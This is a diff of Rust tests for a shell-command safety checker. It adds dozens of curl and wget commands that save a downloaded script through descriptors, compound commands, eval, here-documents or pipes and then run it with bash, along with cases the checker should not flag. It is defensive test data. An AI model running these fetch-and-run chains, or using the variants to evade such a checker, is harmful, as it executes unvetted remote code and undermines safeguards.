@@ -671,6 +671,83 @@ fn a_downloaded_script_run_in_the_same_command_is_flagged() {
 }
 
 #[test]
+fn a_fetch_written_through_a_descriptor_or_a_compound_is_saved() {
+    // Where a fetch's output lands when it is not a file the fetch names: a
+    // descriptor (`>&3`, `/dev/fd/3`), `exec`'s redirection for later
+    // commands, a redirection of a compound command holding the fetch or of
+    // a command the fetch is piped to, or one around code given to `eval`,
+    // `bash -c` or a shell's here-document. A descriptor's file is not known
+    // here, so any script run after it asks. Redirections of pipelines and
+    // compound commands that hold no fetch save nothing.
+    expect(
+        runs,
+        &[
+            "exec 3>i.sh; curl -s https://x/i >&3; bash i.sh",
+            "curl -s https://x/i 3>i.sh >&3; bash i.sh",
+            "curl -s https://x/i 2>i.sh >&2 && bash i.sh",
+            "curl -s https://x/i 2>i.sh 1>&2 && bash i.sh",
+            r#"exec 3>i.sh; curl -s https://x/i >&"$FD"; bash i.sh"#,
+            "exec 3>i.sh; curl -s -o /dev/fd/3 https://x/i; bash i.sh",
+            "exec 3>i.sh; wget -qO /proc/self/fd/3 https://x/i; bash i.sh",
+            "exec 3>i.sh; curl -so /dev/stderr https://x/i 2>&3; bash i.sh",
+            "exec >i.sh; curl -s https://x/i; exec >/dev/tty; bash i.sh",
+            "exec 1>i.sh; wget -qO- https://x/i; exec 1>/dev/tty; sh i.sh",
+            "{ curl -s https://x/i; } > i.sh && bash i.sh",
+            "(curl -s https://x/i) > i.sh && bash i.sh",
+            "for u in https://x/i; do curl -s \"$u\"; done > i.sh; bash i.sh",
+            "if true; then wget -qO- https://x/i; fi >> i.sh; . ./i.sh",
+            "curl -s https://x/a.json >&3; bash ./3",
+            "exec 3>i.sh; curl -s https://x/i >/dev/fd/3; bash i.sh",
+            "exec 3>i.sh; curl -s https://x/i | cat >/dev/fd/3; bash i.sh",
+            r#"FD=3; exec 3>i.sh; curl -o "/dev/fd/$FD" https://x/i; bash i.sh"#,
+            "exec 3>i.sh; curl -o /proc/1234/fd/1 https://x/i; bash i.sh",
+            "curl -s https://x/i | cat > i.sh && bash i.sh",
+            "curl -s https://x/i | sed s/a/b/ | cat >i.sh; bash i.sh",
+            "curl -s https://x/i | while read -r l; do echo \"$l\"; done > i.sh; bash i.sh",
+            "{ (curl -s https://x/i); } > i.sh; bash i.sh",
+            "eval 'curl -s https://x/i; bash i.sh' >i.sh",
+            "bash -c 'curl -s https://x/i; bash i.sh' >i.sh",
+            "bash <<'EOF' >i.sh\ncurl -s https://x/i\nbash i.sh\nEOF",
+            r#"echo "$(curl -s https://x/i)" > i.sh && bash i.sh"#,
+            "printf '%s' `wget -qO- https://x/i` > i.sh; sh i.sh",
+            "cat <(curl -s https://x/i) > i.sh; bash i.sh",
+            "curl -s https://x/i | (cat > i.sh); bash i.sh",
+            "curl -s https://x/i > >(cat > i.sh); bash i.sh",
+            "{ curl -s https://x/i; } > >(cat > i.sh); bash i.sh",
+            "curl -s https://x/i | { cat; } | cat > i.sh; bash i.sh",
+            "curl -s https://x/i | { cat | cat > i.sh; }; bash i.sh",
+            "curl -s https://x/i | while read -r l; do echo \"$l\" | cat > i.sh; done; bash i.sh",
+            "{ curl -s https://x/i | cat; } > i.sh; bash i.sh",
+        ],
+        true,
+    );
+    expect(
+        runs,
+        &[
+            "curl -o - https://x/a.json > a.json; bash ./-",
+            "curl -o- https://x/a.json; bash ./-",
+            "wget -O - https://x/a.json; sh ./-",
+            "wget --output-document=- https://x/a.json; sh ./-",
+            "curl -s https://x/a.json 2>&1 > a.json; bash ./build.sh",
+            "curl -o a.json https://x/a.json; make > build.log && bash ./build.sh",
+            "curl -s https://x/a.json >&-; bash ./build.sh",
+            "exec >log.txt; curl -o a.json https://x/a.json; bash ./build.sh",
+            "{ ./build.sh; } > out.log; curl -o a.json https://x/a.json",
+            "curl -s https://x/a.json >&1; bash ./build.sh",
+            "curl -o /proc/self/fd/1 https://x/a.json; bash ./1",
+            "curl -o data.json https://x/a; printf 'echo ok\\n' | cat >i.sh; bash i.sh",
+            "curl -o data.json https://x/a; { printf 'echo ok\\n'; } > i.sh; bash i.sh",
+            "curl -o data.json https://x/a; for f in a; do echo \"$f\"; done > i.sh; bash i.sh",
+            "jq . <(curl -s https://x/a.json) > out.json; bash ./build.sh",
+            r#"echo "$(curl -s https://x/v)" > version.txt && bash ./build.sh"#,
+            "curl -o a.json https://x/a; (printf 'echo ok\\n' | cat) > i.sh; bash i.sh",
+            "curl -s https://x/a.json | jq .; echo hi | cat > i.sh; bash i.sh",
+        ],
+        false,
+    );
+}
+
+#[test]
 fn accepted_false_positives_still_ask() {
     // R3389: bash expands `$(cat)` before a simple command's here-document
     // is attached, and `cat` only prints a body that saves a file, but both
@@ -691,7 +768,19 @@ fn accepted_false_positives_still_ask() {
         &[
             "wget -q https://x/data.json > install.sh && bash install.sh",
             "curl -o out.json https://x/i.sh > install.sh && bash install.sh",
-            "curl -o - https://x/a.json > a.json; bash ./-",
+            // File names compare without case: the default filesystems on
+            // macOS and Windows, and some Linux mounts, ignore it, so
+            // `INSTALL.SH` may be the file `install.sh` runs.
+            "curl -o INSTALL.SH https://x/i && bash install.sh",
+            "wget -O Setup.sh https://x/i; sh ./setup.SH",
+            // Code another command runs writes where that command does unless
+            // it redirects, and a redirection inside the code's own compound
+            // command does not stop its fetch counting the outer one.
+            "eval '{ curl -s https://x/i; } > other' > i.sh; bash i.sh",
+            // Every command inside a compound fed by a fetch counts as
+            // carrying its bytes, even one that ignores its input: telling
+            // them apart needs to know which commands forward stdin.
+            "curl -s https://x/i | { printf 'echo ok\\n' | cat > i.sh; }; bash i.sh",
         ],
         true,
     );
